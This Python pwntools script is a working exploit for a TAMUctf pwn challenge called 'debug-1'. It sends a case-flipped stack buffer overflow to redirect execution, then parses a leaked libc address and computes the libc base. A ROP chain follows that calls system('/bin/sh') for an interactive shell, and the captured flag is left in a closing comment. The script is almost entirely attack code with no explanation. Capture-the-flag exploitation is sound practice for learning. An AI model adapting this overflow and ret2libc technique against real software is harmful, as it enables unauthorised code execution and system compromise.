from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./debug-1_patched', '''
    b *0x4013a0
    continue
''')

# p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

def modify_payload(payload):
    result = b''
    for byte in payload:
        # Check if uppercase letter (65-90 in ASCII)
        if 65 <= byte <= 90:
            # Convert to lowercase by adding 32
            result += bytes([byte + 32])
        # Check if lowercase letter (97-122 in ASCII)
        elif 97 <= byte <= 122:
            # Convert to uppercase by subtracting 32
            result += bytes([byte - 32])
        else:
            # Keep other characters unchanged
            result += bytes([byte])
    return result

p.sendlineafter(b'3: Exit\n\n', b'1')
p.recvuntil(b'Input a string (max length of 69 characters):\n\n')
p.send(modify_payload(b'\0'*0x58+p64(0x4013a0)))

glibc_e = ELF('./libc.so.6')
glibc_r = ROP('./libc.so.6')


p.sendlineafter(b'3. Feature 3 (I hope your day is going well :) )\n', b'1')
p.recvuntil(b'libc leak: ')
glibc_base_addr = int(p.recvline().strip().decode(), 16)-glibc_e.symbols.system
print(f'glibc base address: {hex(glibc_base_addr)}')

p.recvuntil(b'Leave a message here (max: 80 characters)!\n')
chain = [
    glibc_r.rdi.address + glibc_base_addr,
    next(glibc_e.search(b"/bin/sh")) + glibc_base_addr,
    glibc_r.ret.address + glibc_base_addr,
    glibc_e.symbols.system + glibc_base_addr
]
p.send(b'\0'*0x68+b''.join([p64(c) for c in chain]))

p.interactive()

# gigem{d3bUg61ng_n3w_c0d3_a24dcfe3}